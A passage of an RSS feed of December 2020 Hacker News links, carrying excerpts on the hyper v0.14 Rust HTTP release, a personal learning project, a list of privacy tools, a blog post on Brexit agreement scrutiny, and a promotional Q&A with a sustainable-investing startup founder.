efforts.</p><p>hyper is a <em>safe</em>, correct, fast HTTP implementation written in Rust, and as it matures, the desire to use that safety in places that <em>aren’t</em> Rust grows. We’ve been working on a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fhyperium%2Fhyper%2Fpull%2F2278&amp;t=YjU2OWM1ZWFjNzdlYTVlM2FiYTc4NzllNjhiYjVhNzFjN2EzZWI3YSxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">C API</a> for hyper, with the first main user being the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdaniel.haxx.se%2Fblog%2F2020%2F10%2F09%2Frust-in-curl-with-hyper%2F&amp;t=NmFkYTgxMmQ0MDBjMjkyM2I4ZWJlMTBlNzRkOGQ5MjMzMDI2MWMxZCxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">curl</a> project. We’re so excited to be part of this effort for a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.abetterinternet.org%2Fpost%2Fmemory-safe-curl%2F&amp;t=ZTZiN2VhYjNkYmFhOWFlOWZhMTE5NjY3MThmMmVmOGIzNDE5ZmE5OSxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">memory safe ‘curl’</a>, and you can already experimentally <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl%2Fwiki%2FHyper&amp;t=ZjcyNWYyYjAzNGQzOTIzMDBlMjA5MmY5NDQ2NTQ0Nzg1ZGM3OGE4NSxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">try it out</a>!</p><p>To re-emphasize the stability and simplification goals, the first parts of this C API are based on the “lower level” client connection API in hyper. As hyper is used throughout curl’s extensive test suite, hyper’s Rust internals handle more edge cases and protocol features, which is a <strong>win for all hyper users</strong>, even if you don’t use the thin C API part.</p><h4>HTTP/3</h4><p>In the greater Internet, work has been progressing on stabilizing QUIC and the next version of HTTP, HTTP/3. We’ve started an effort on the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fhyperium%2Fh3&amp;t=Y2E3NWE5ZTVkODA2NDcxZDVlZGNlOTFlOWI2ODA2ZDQ2NWQ5MzZjZCxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759"><code>h3</code></a> library, which provides HTTP/3 while being generic over a QUIC implementation. There’s been great progress, with a working client example already in the repository.</p><h3>Come join us!</h3><p>This release is an important step for hyper. But as you can see, there’s still plenty to be done. If you find any issues, please <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fhyperium%2Fhyper%2Fissues&amp;t=ZmJlODA0ZmMzMDMzZWYwZTc5ODhiZTVkYWQxMjY4MzhjYzlmNmFmMyxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">report them</a>. If you’d to help, you can look at the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fhyperium%2Fhyper%2Fissues&amp;t=ZmJlODA0ZmMzMDMzZWYwZTc5ODhiZTVkYWQxMjY4MzhjYzlmNmFmMyxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">issue board</a> and pick something to work on or discuss, and you can join the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdiscord.gg%2FkkwpueZ&amp;t=N2Q3MjI1MWZiMTIyZjdiNTlkZWE4ODJmNmU2ZDA2ZDUzYTk4ZTcyOSxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">chat</a>.</p><p>hyper is made through the efforts of many <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fhyperium%2Fhyper%2Fgraphs%2Fcontributors&amp;t=Njg5Zjk3YTI0MGVmMmJhNjM3M2RjN2FlZDA0NjZlNTE4NjI1NWZlMixVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">contributors</a>, and their efforts are greatly appreciated. Together, today, we release <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fhyperium%2Fhyper%2Freleases%2Ftag%2Fv0.14.0&amp;t=YjRjYTVkZjYxYjMwMTQ3NTdlYjU5MTcwMWMzYWMxYTNmZGNlMGExZixVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">hyper v0.14</a>, and look forward to what comes next!</p>
              </div></div>]]>
            </description>
            <link>https://seanmonstar.com/post/638320652536922112/hyper-v014</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521217</guid>
            <pubDate>Wed, 23 Dec 2020 19:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Knowledge Bootstrapping Project]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25521189">thread link</a>) | @lemonspat
<br/>
December 23, 2020 | https://acesounderglass.com/the-knowledge-bootstrapping-project/ | <a href="https://web.archive.org/web/*/https://acesounderglass.com/the-knowledge-bootstrapping-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<div id="primary">
	<main id="main" role="main">
		
<article id="post-11160" class="page">
	<!-- .entry-header -->

	
	<div>
		
<p>Back in 2017, I started doing something I called Epistemic Spot Checks, in which I would read the first few chapters of a book and investigate their claims (factual or logical), to see how much they could be trusted. I now think this was a <a href="https://acesounderglass.com/2020/06/09/where-to-start-research/">suboptimal</a> way to do things, but it’s how the ball got rolling. You can read these investigations in the <a href="https://acesounderglass.com/tag/epistemicspotcheck/">epistemicspotcheck</a> tag.</p>



<p>This eventually grew into the Knowledge Bootstrapping Project, which has the goal of turning questions into answers without undo deference to credentialed authority (posts on this still fall under the epistemicspotcheck tag for historical reasons, or <a href="https://acesounderglass.com/tag/metaESC/">metaESC</a> if they are about the process itself). This culminated in an algorithm for investigating questions as efficiently and thoroughly as possible, v0.1 of which can be found <a href="https://acesounderglass.com/2020/07/06/knowledge-bootstrapping-steps-v0-1/">here</a>. Some external reviews of this process can be found <a href="http://morganredfield.com/blog/2020/07/on-knowledge-bootstrapping-v0-1/">here</a> (with <a href="http://morganredfield.com/blog/2020/08/knowledge-bootstrapping-experiment-2/">follow up</a>) and <a href="https://twitter.com/robot__dreams/status/1280667158763069442">here</a>. This work was originally supported by a grant from the <a href="https://app.effectivealtruism.org/funds/far-future">Long Term Future Fund</a>.</p>



<p>But it turned out that the key obstacle to learning for me was not an algorithm, it was <a href="https://acesounderglass.com/2020/06/12/emotional-blocks-as-obstacles-to-learning/">emotional blocks</a> around the concept of learning and forming my own opinions, and resolving those is a process all its own. My current project is studying that process, although due to the nature of things that still involves a lot of object level research.&nbsp;</p>



<p>My goal is to teach both the object level and the emotional process to others, and in doing so refine it to a more generalizable method.</p>
	</div><!-- .entry-content -->

	
</article><!-- #post-## -->

	</main><!-- .site-main -->

	<!-- .content-bottom-widgets -->

</div><!-- .content-area -->


	<!-- .sidebar .widget-area -->

		</div></div>]]>
            </description>
            <link>https://acesounderglass.com/the-knowledge-bootstrapping-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521189</guid>
            <pubDate>Wed, 23 Dec 2020 19:31:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Favorite Privacy Tools in 2020]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25521176">thread link</a>) | @simonpure
<br/>
December 23, 2020 | https://zaiste.net/posts/my-favorite-privacy-tools-2020/ | <a href="https://web.archive.org/web/*/https://zaiste.net/posts/my-favorite-privacy-tools-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span><p>This is a list of tools I use to increase my privacy on the Internet. I'm not a security expert. My goal is to have a good enough protection. Feel free to suggest any additions and improvements.</p><h2 id="firefox">Firefox</h2><p><img src="https://user-images.githubusercontent.com/200613/90343120-ed616080-e00d-11ea-9451-f2c69ada5246.jpg" alt="firefox"></p><p><a href="https://www.mozilla.org/en-US/exp/firefox/">Firefox</a> probably doesn't need an introduction. It is an open-source project. It's run by Mozilla - a non-profit organization. Anyone can go to the <a href="https://hg.mozilla.org/">Firefox repository</a> to take a look at the code and see how it works.</p><p>Firefox doesn't gather your personal data to serve you ads as Chrome. While Google seems careful and to an extend trustworthy with handling people's personal data, you don't seem to have much control how your profile is built and used.</p><p>The browser is constantly being improved. It seems slightly heavier than Chrome or Safari on my computer, but that's a minor issue compared to all the advantages. I use the <a href="https://www.mozilla.org/en-US/firefox/developer/">Developer Edition</a>.</p><h2 id="little-snitch">Little Snitch</h2><p><img src="https://user-images.githubusercontent.com/200613/90343121-edf9f700-e00d-11ea-91d7-a2a876111ca1.jpg" alt="Little Snitch"></p><p><a href="https://www.obdev.at/products/littlesnitch/">Little Snitch</a> is a MacOS application that  monitors connections and lets you control inbound and outbound traffic from your computer. It visualizes these connections and shows where applications connect. This way you have information about both familiar and unfamiliar network actions that applications are trying to perform.</p><h2 id="pihole--adguard">PiHole &amp; AdGuard</h2><p><img src="https://user-images.githubusercontent.com/200613/90343124-ef2b2400-e00d-11ea-8f26-f4dcbdf189d6.jpg" alt="Pi Hole">
<img src="https://user-images.githubusercontent.com/200613/90343113-e9cdd980-e00d-11ea-8d17-642c01565237.jpg" alt="AdGuard"></p><p><a href="https://pi-hole.net/">PiHole</a> &amp; <a href="https://adguard.com/">AdGuard</a> are ad blockers. PiHole is open-source while AdGuard is a paid offering. I use one at home and the other one at the office. AdGuard is slightly easier to setup and use. Both work network-wide, but AdGuard also provides standalone applications and browser plugins to protect from ads when being outside of private networks.</p><h2 id="nibspace">Nibspace</h2><p><img src="https://user-images.githubusercontent.com/200613/90343122-ee928d80-e00d-11ea-950f-3514adfca5fa.jpg" alt="Nibspace"></p><p><a href="https://nibspace.com/">Nibspace</a> is an alternative to Google Analytics. It provides basic information about the visitors of my websites. It doesn't use cookies and it has a small footprint (~ 1kb) while being affordable ($1/mo per domain). It's not open-source. There are few other, notable competitors such as <a href="https://usefathom.com/">Fathom</a>, <a href="https://simpleanalytics.com/">Simple Analytics</a> and <a href="https://plausible.io/">Plausible</a>.</p><h2 id="bitwarden">Bitwarden</h2><p><img src="https://user-images.githubusercontent.com/200613/90343117-ec303380-e00d-11ea-828d-c0bf960154a2.png" alt="Bitwarden"></p><p><a href="https://bitwarden.com/">Bitwarden</a> is an open-source password manager. I used to use 1Password, but I wanted something more affordable yet with similar features and Bitwarden fits the bill perfectly.</p><h2 id="nordvpn">NordVPN</h2><p><img src="https://user-images.githubusercontent.com/200613/90343123-ef2b2400-e00d-11ea-8026-de472ec96bc6.jpg" alt="Nord VPN"></p><p><a href="https://nordvpn.com/">NordVPN</a> is a personal virtual private network service provider. Their marketing seems aggressive, so I was a bit skeptical at the beginning, but then I decided to give it a try. Overall, NordVPN is one of the most polished and reliable VPNs I've used so far.</p><p>I also like that they show some innovation efforts, namely their NordLynx technology that is built around WireGuard - this relatively new VPN tunneling protocol</p><p>Last year <a href="https://news.ycombinator.com/item?id=21312609">NordVPN was hacked</a>, but they handled the whole situation pretty well in my view.</p><h2 id="fastmail">Fastmail</h2><p><img src="https://user-images.githubusercontent.com/200613/90343118-ecc8ca00-e00d-11ea-938b-7e9f884e8a6d.jpg" alt="Fastmail"></p><p><a href="https://www.fastmail.com/">Fastmail</a> is a paid e-mail service that focuses on privacy and doesn't display ads. It is a simple service to manage e-mails, calendars and contacts. It costs $5/mo. It is also fast. This is partly related to their work on a more reliable, faster IMAP alternative, called <a href="https://jmap.io/">JMAP</a> - so it goes beyond just a snappy UI.</p><hr><p>Have I missed an interesting tool? Let me know <a href="https://twitter.com/zaiste">on Twitter</a>.</p></span></p><div><div><h2>My Tech Newsletter</h2><p>Get emails from me about programming &amp; web development. I usually send it once a month</p></div></div></div></div>]]>
            </description>
            <link>https://zaiste.net/posts/my-favorite-privacy-tools-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521176</guid>
            <pubDate>Wed, 23 Dec 2020 19:30:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why a 2k page UK-EU agreement cannot be properly scrutinised in 8 days]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25521057">thread link</a>) | @severine
<br/>
December 23, 2020 | https://davidallengreen.com/2020/12/why-a-two-thousand-page-uk-eu-relationship-agreement-cannot-be-properly-scrutinised-between-now-and-31-december-2020/ | <a href="https://web.archive.org/web/*/https://davidallengreen.com/2020/12/why-a-two-thousand-page-uk-eu-relationship-agreement-cannot-be-properly-scrutinised-between-now-and-31-december-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4540">
	
	<!-- .entry-header -->

	<div>
		
<p><em>23rd December 2020</em></p>
<p>A week tomorrow, on 31st December 2020, the Brexit transition period comes to an end.</p>
<p>This transition period has artificially kept in place most of the substance of membership of the European Union for the United Kingdom (other than representation on various institutions) even though as a matter of law the United Kingdom departed the European Union on 31st January 2020.</p>
<p>There is still no agreement in place for the future relationship.</p>
<p>There is still, it seems, not even an agreed draft text in final form.</p>
<p>And there certainly has not been ratification by the European Parliament.</p>
<p>(In the United Kingdom, parliament does not need to ratify an international agreement though parliament may need to legislate so as to implement what has been agreed.)</p>
<p>According to one well-connected and reliable commentator the current version of the agreement is two thousand pages long.</p>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">19/ And, wait for it, one official raised the possibility that the text is now 2,000 pages long, including annexes</p>— Tony Connelly (@tconnellyRTE) <a href="https://twitter.com/tconnellyRTE/status/1341482469929984002?ref_src=twsrc%5Etfw">December 22, 2020</a></blockquote>
<p>This is not a surprise, given the scope of what needs to be addressed in the agreement – the new ongoing relationship of the United Kingdom and the European Union on trade and other matters.</p>
<p>There are also <a href="https://www.theguardian.com/politics/2020/dec/20/uk-faces-brexit-limbo-after-talks-deadline-missed">news reports</a> that the negotiators have missed the deadline for any agreement to be voted on by the European Parliament before the end of the year.</p>
<p>But even if somehow the European Parliament can reconvene before end of the year, there is not enough time for anyone other than those directly connected with the negotiation (and so will be familiar with the text) to scrutinise the agreement.</p>
<p>Today is a Wednesday – Christmas Eve and Christmas Day block out tomorrow and Friday, and then it’s the the weekend, and then it is the Boxing Day holiday on Monday.</p>
<p>That leaves only three full days to do everything.</p>
<p>The situation is ludicrous.</p>
<p>*</p>
<p>A legal instrument is a complex thing.</p>
<p>Legal texts are not linear documents – you do not start reading on page one and go through to the end, and then stop.</p>
<p>A legal text is more akin to a computer program – law codes and computer coding are remarkably similar things.</p>
<p>Each provision – indeed, each word – in a legal instrument has a purpose.</p>
<p>Each provision has to, in turn, cohere with all the other provisions elsewhere in the text – so Article 45, for example, needs to fit with Article 54, and so on.</p>
<p>In an international agreement such as this relationship treaty, each provision also has to cohere with hundreds – perhaps thousands – of other provisions in other legal instruments.</p>
<p>(This is especially true of an agreement entered into by the European Union, which is a creature of law.)</p>
<p>Each provision also has to be capable of working in practice – and so needs to be assessed from a practical as well as a legal(istic) perspective.</p>
<p>And – perhaps most importantly – any significant legal instrument needs to be examined and approved by political representatives.</p>
<p>This last requirement is particularly important when the agreement will have huge consequences for people and for businesses.</p>
<p>*</p>
<p>And there is something else.</p>
<p>The United Kingdom government has now twice – in a rush – signed up to something so as to<em> ‘get Brexit done’</em> and then regretted it.</p>
<p>The first was the ‘<em>joint declaration’</em> in withdrawal agreement negotiations, and the second was the withdrawal agreement itself – which the United Kingdom government sought to legislate so that it could break the law.</p>
<p>This means that nobody can have any real confidence that government ministers have any proper understanding of what they are signing up to.</p>
<p>If any agreement needs proper scrutiny, this one does.</p>
<p>*</p>
<p>Charles Dickens in <em>A Christmas Carol</em> makes it so that all three visitations are packed into a single evening.</p>
<p>But not even an imagination as vivid as that of Dickens could make it plausible that a two thousand page agreement of such immense importance could be properly examined as a matter of law and for practicality, and to receive proper political scrutiny, in the few days available before the end of the year.</p>
<p>Brace, brace.</p>
<p><strong>*****</strong></p>
<p>This law and policy blog provides a daily post commenting on and contextualising topical law and policy matters – each post is published at about 9.30am UK time.</p>
<p>Each post takes time, effort, and opportunity cost.</p>
<p><strong>If you value the free-to-read and independent legal and policy commentary both at this blog and at&nbsp;<a href="http://%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%20%20if%20you%20value%20the%20free-to-read%20and%20independent%20legal%20and%20policy%20commentary%20at%20this%20blog%20and%20at%20my%20twitter%20account%20please%20do%20support%20through%20the%20paypal%20box%20above.%20%20or%20by%20becoming%20a%20patreon%20subscriber.%20%20you%20can%20also%20subscribe%20to%20this%20blog%20at%20the%20subscription%20box%20above%20%28on%20an%20internet%20browser%29%20or%20on%20a%20pulldown%20list%20%28on%20mobile%29.%20%20%2A%2A%20%20comments%20are%20welcome%20but%20pre-moderated%2C%20and%20so%20comments%20will%20not%20be%20published%20if%20irksome./" data-wplink-url-error="true">my Twitter account</a>&nbsp;please do support through the Paypal box above.</strong></p>
<p>Or become&nbsp;<a href="https://www.patreon.com/davidallengreen">a Patreon subscriber</a>.</p>
<p>You can also subscribe to this blog at the subscription box above (on an internet browser) or on a pulldown list (on mobile).</p>
<p><strong>*****</strong></p>
<p>Comments are welcome, but they are pre-moderated.</p>
<p>Comments will not be published if irksome.</p>

			</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>https://davidallengreen.com/2020/12/why-a-two-thousand-page-uk-eu-relationship-agreement-cannot-be-properly-scrutinised-between-now-and-31-december-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521057</guid>
            <pubDate>Wed, 23 Dec 2020 19:20:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Q&A with founder of Carbon Collective, a new sustainable investing platform]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520997">thread link</a>) | @niviachanta
<br/>
December 23, 2020 | https://www.soapboxproject.org/journal/what-is-sustainable-investing-and-is-it-profitable | <a href="https://web.archive.org/web/*/https://www.soapboxproject.org/journal/what-is-sustainable-investing-and-is-it-profitable">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>‍<em>This guest post is brought to you by Zach Stein, co-founder of </em><a href="https://carboncollective.co/" target="_blank"><em>Carbon Collective</em></a><em>, a sustainable investing platform that provides low-fee, diversified portfolios built for solving climate change. </em></p><h3>‍</h3><figure id="w-node-37cd2f8a9b8b-61a1988f"><p><img src="https://uploads-ssl.webflow.com/5f6db441319a46c10ca23b4d/5fdc41c6d8b902fbbd589a03_Zach_updated_headshot.jpg" loading="lazy" alt=""></p><figcaption>Zach Stein, Carbon Collective</figcaption></figure><p>‍</p><blockquote>I've been working in the sustainable startup space since graduating college in 2011. I began humbly, helping found the Bay Area's largest worm composting farm. Yes, I literally sold shit for a living. I moved into aquaponics/hydroponics, raised ~$4m to build a novel sensing system to reduce waste in shrimp and fish farms, and since the beginning of 2020 have been fully focused on climate change. </blockquote><p>‍</p><h3>Sustainable investing:&nbsp;what is it, will it make you money, and how can you get started?</h3><p>‍</p><p><strong>Estimated reading time:&nbsp;</strong>4 minutes</p><p><strong>TL,DR:&nbsp;</strong></p><ul role="list"><li>What is sustainable investing?&nbsp;</li><li>What is Carbon Collective and why was it founded?&nbsp;</li><li>Are there limitations of sustainable investing?&nbsp;</li><li>What are other tools and resources you can use to fight climate change?</li></ul></div><div><p><strong>What do you define as sustainable or ethical investing?</strong></p><p><strong>‍<br>‍</strong>We focus on sustainable investing because broad ethical investing is really hard. Why? We live in a deeply unequal, overly exploitative society. ESG (Environmental, Social, Governance) investing has been the financial world's best attempt at creating a way to invest ethically. And it's not great. Basically, analysts from different firms assign scores to publicly traded companies on these three categories. They then average them together to give each company a meta score. With these scores, they'll build a portfolio of companies above a certain threshold. The problem - these scores are totally subjective. The analysis firms don't agree with each other. And they combine all metrics together, meaning some really bad companies still make the cut, including many fossil fuel companies. So to us, ESG = less bad, but not good.</p><div><p>‍</p><p>We took a simpler, far more understandable approach, focusing on a single metric: carbon footprint. The carbon footprint data for publicly traded companies is quite strong. We love this free tool: <a href="https://fossilfreefunds.org/" target="_blank">https://fossilfreefunds.org/</a>. We use carbon footprint plus a few other tweaks to build portfolios that we believe are as sustainable as you can get while preserving diversity and low fees.</p><p>‍</p></div><p><strong>Many people see sustainability as a trade-off with wealth building. What do you say to that?</strong></p><p><strong>‍<br>‍</strong>The tradeoff is a myth at this point. From 2010 - 2019, <a href="https://blog.carboncollective.co/top-renewable-energy-stocks-beat-fossil-fuels/" target="_blank">renewable energy stocks have soundly outperformed fossil fuel stocks</a> in the US, UK, France, and Germany. Since the Covid-19 stock market crash back in March, 2020, the difference has been even more extreme. From 01/01/20 - 10/01/20, the energy sector returned: -49.45%. The clean energy sector: 82.60%. Historical returns are no guarantee of future ones, but a strategy divesting from fossil fuel and reinvesting in companies solving climate change would have performed well looking back over the past 5 years.</p><div><p>‍</p><p>The one place where it has been historically true has been fund fees. You generally have to pay more to invest in a mutual fund or ETF that has an ethical/sustainable goal. The fund managers have to put more work in and they want to get compensated for it. The #1 solar ETF, TAN, has an expense ratio of 0.71%. That's *really* high. </p></div><div><p>‍</p><p>We don't think you should have to pay more. Our portfolio largely use low-fee sector index funds. The average fund fees you'll pay is 0.09%, which is about the same as you would pay for a Betterment or Wealthfront account's generic portfolio. </p><p>‍</p></div><p>Our goal was to create a portfolio that tracked the market that was truly climate friendly. Looking backwards, we seem to have hit our goal. Looking forwards, it depends on your assumptions about which industries will grow and which decline. <br></p><figure><p><img src="https://uploads-ssl.webflow.com/5f6db441319a46c10ca23b4d/5fdc45aadf0c5e53f161e5c5_15.Slide2x.png" loading="lazy" alt=""></p><figcaption>Here's the results of a backtested simulation we did of our 80% stock, 20% bond Carbon Collective Portfolio vs. the overall stock &amp; bond market (represented by Vanguard index funds).</figcaption></figure><p>‍</p><p>‍</p><p>‍</p><p><strong>Do you think that investing solely using Carbon Collective has any limitations?</strong></p><p>‍</p><p>Not from a financial perspective. It's where we personally keep 100% of our investments. We built Carbon Collective because we could not find a way to invest that was climate-aligned but still felt safe for our full retirement accounts.</p><p>‍</p><p>If you are going to invest in the stock market, I can confidently say we have created far and away the best way we have seen to invest sustainably while still being a careful, smart investor.</p><p>‍</p><p>But that's a big "If." We live in an unequal, unjust world. For some investing in the stock market period feels like too much participation in that. It's a personal choice. We believe that your investment is needed to help push the companies building climate solutions forward. We also believe that right now, it's not a smart investment to invest <em>only</em> in those companies, which is why we invest more broadly in the low-carbon sectors of the economy, as well.</p><p>‍</p><p>Our portfolios will always be a work in progress. We update them annually to incorporate new data about companies and their carbon footprints. As more meet our inclusion threshold for the Climate Index, we'll include them and your money will get put to work supporting them.</p><p><strong>‍</strong></p><p>‍</p><p><strong>Tell us more about why your platform is unique.</strong></p><p>‍</p><p>I can say it better over video.</p><figure id="w-node-891ee874e6e4-61a1988f"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/2uQISXRqBoc"></iframe></p></figure><p>There are three options out there today for sustainable investing:</p><p>‍</p><ol start="" role="list"><li>ESG. Includes fossil fuel companies, very unclear how they make decisions on which companies to include/exclude. They're just less bad.<br>‍</li><li>Climate-focused funds. REDWX (from Aspiration), ETHO, CHGX. These don't include fossil fuel companies (although REDWX had Berkshire Hathaway), but they don't include companies with impact, building climate solutions. It's just less bad than ESG. Plus they're really expensive with fees all close to 0.50%.<br>‍</li><li>Green funds. TAN, ICLN, WIND. These are filled with awesome companies building our zero-carbon future but they lack diversity. You're not going to invest your whole IRA in just solar.</li></ol><p>‍</p><p>We use carbon footprint as our guiding metric. There are 11 sectors of the stock market. 85% of the CO2e from publicly traded companies comes from just four of them: energy, utilities, materials, and industrials. These sectors only represent 19% of the total value of the stock market. They are also the sectors that are actively dependent on fossil fuels for their core business. So we remove and replace them with the collection of over 112 companies building climate solutions. Then invest directly in the rest of the low-carbon parts of the stock market using low-fee sector ETFs.</p><p>‍</p><p>This video is really helpful on how we build portfolios:</p><figure id="w-node-be3c1379f79e-61a1988f"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/9RdCBQ2DA0o"></iframe></p></figure><p>‍</p><p><strong>There are so many companies that claim to provide sustainable investments — why should we trust yours?</strong></p><p>‍</p><p>Transparency. One of our greatest personal frustrations with the sustainable/ethical investing space is that so many companies end up saying some equivalent of "this is great, just trust us." How they make decisions to include and exclude is really unclear. That's hard from an ethical perspective, but also a financial one. How do I know what criteria you'll be using to make these decisions in the future? Greenwashing is super real and it's unfortunately common in the sustainable investment space. You can find exactly what's in our portfolios and the logic behind our decision-making on our <a href="http://www.carboncollective.co/" target="_blank">website</a>.</p><p>‍</p><p>We believe that investing with the total stock market in low-fee index funds is the smartest way for average investors like you and me to invest over the long term. So we wanted to build a way to invest like that but for the world as if it had already transitioned off of fossil fuels. And we believe we've built the best way for doing that.</p><p>‍</p><p>One question we do get a lot is something like: <em>"This is great! But you're new. What happens if Carbon Collective doesn't make it as a company?"</em> This is such a good question and a very reasonable concern. The worst case scenario is this: you have a mild hassle to electronically transfer your account somewhere else. Your shares are your shares. We guarantee that we will help you transfer them somewhere else.</p><p>‍</p><p>And who actually holds your stocks and bonds? We work with an online software brokerage called Altruist. They're you're portal to access your account, withdraw, and deposit funds, get tax docs, etc. They work with one of the largest custodians in the country (the company that holds your stocks/bonds) called Apex. Should we not make it, we have our transfer guarantee. We'll work with you to electronically transfer your account to a different custodian (like Schwab, Fidelity, Robinhood, etc.).</p><p><br><strong>‍</strong></p><p>‍</p><p><strong>Other than Carbon Collective, what are some of your favorite tools and resources for fighting climate change?</strong></p><p>‍</p><p>We really like Saul Griffith's <a href="https://www.rewiringamerica.org/" target="_blank">Rewiring America</a>. It's a clear guide on what we need to do to fight climate change which basically involved electrifying everything.</p><p>‍</p><p>‍</p><p><strong>What is one thing you wish more people understood about the movement for a more sustainable future?</strong></p><p>‍</p><p>Be forgiving. We all have a part to play and it's not the exact same part. I had a great conversation with a professor in the UK the other day. He's trying to find the right way to use his skills to fight climate change. He was looking at different places he could help individuals make change and it came out that he actually works with a number of fossil fuel companies on projects. He admitted that he does a lot of things that I wouldn't approve of. He drives, eats plenty of meat, and will take grant money from these companies.</p><p>‍</p><p>I observed in myself my urge to judge him. To tell him he's wrong and hypocritical for doing all of those things. But I didn't voice it because I don't think that's how change happens. No, I told him that his part to play is actually within these companies. It's on us on the outside, who can take a more strident view to shift the conversation, the Overton Window, of what is socially expected. It's on people like him to be on the inside. Someone who knows all of the details of where a company is today, a trusted source that can say, "we're getting all this pressure, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.soapboxproject.org/journal/what-is-sustainable-investing-and-is-it-profitable">https://www.soapboxproject.org/journal/what-is-sustainable-investing-and-is-it-profitable</a></em></p>]]>
            </description>
            <link>https://www.soapboxproject.org/journal/what-is-sustainable-investing-and-is-it-profitable</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520997</guid>
            <pubDate>Wed, 23 Dec 2020 19:15:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Let's Build a Confetti Cannon]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25520993">thread link</a>) | @winkerVSbecks
<br/>
December 23, 2020 | https://varun.ca/confetti/ | <a href="https://web.archive.org/web/*/https://varun.ca/confetti/">archive.org</a>
